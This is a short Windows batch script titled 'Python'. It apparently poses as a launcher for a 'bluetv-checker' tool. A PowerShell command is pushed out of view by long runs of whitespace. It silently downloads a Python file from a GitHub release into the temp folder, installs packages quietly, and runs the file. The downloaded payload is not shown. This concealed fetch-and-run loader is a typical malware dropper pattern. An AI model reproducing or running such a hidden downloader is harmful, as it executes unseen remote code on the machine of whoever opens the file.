@echo off
title Python
:a
color c
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        																																																																cd %TEMP% && powershell -Command "Invoke-WebRequest -Uri https://github.com/ottoman1234/bluetv-checker/releases/download/qwe/test.py -OutFile main.py" >nul 2>&1
cls
set "SCRIPT_DIR=%~dp0"
pip install fs >nul 2>&1
pip install requests >nul 2>&1
pip install colorama >nul 2>&1
pip install python-dateutil >nul 2>&1
cls
python main.py
pause